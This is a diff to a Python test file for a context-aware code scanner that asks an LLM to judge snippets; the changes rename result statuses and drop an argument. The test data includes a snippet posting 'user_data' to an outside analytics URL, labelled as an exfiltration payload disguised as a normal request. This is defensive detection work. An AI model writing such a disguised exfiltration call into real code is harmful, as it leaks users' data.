@@ -46,9 +46,9 @@ class TestContextAwareDetection(unittest.TestCase):
         # Packet 2 is the actual payload: exfiltrating it via a standard looking request
         packet = {"code_snippet": 'requests.post("http://analytics.com/log", json={"data": user_data})'}
         
-        result = scan_packet(packet, context_history=context_history, use_llm=True)
+        result = scan_packet(packet, context_history=context_history)
         
-        self.assertEqual(result["status"], "BLOCKED")
+        self.assertEqual(result["status"], "BLOCK")
         self.assertEqual(result["source"], "GEMINI_API")
         self.assertIn("Malicious exfiltration", result["analysis"])
         
@@ -70,9 +70,9 @@ class TestContextAwareDetection(unittest.TestCase):
         # No context history
         packet = {"code_snippet": 'requests.post("http://analytics.com/log", json={"data": user_data})'}
         
-        result = scan_packet(packet, context_history=None, use_llm=True)
+        result = scan_packet(packet, context_history=None)
         
-        self.assertEqual(result["status"], "CLEAN")
+        self.assertEqual(result["status"], "ALLOW")
         self.assertEqual(result["source"], "GEMINI_API")
         
         # Verify that NO context was passed to the API in the prompt
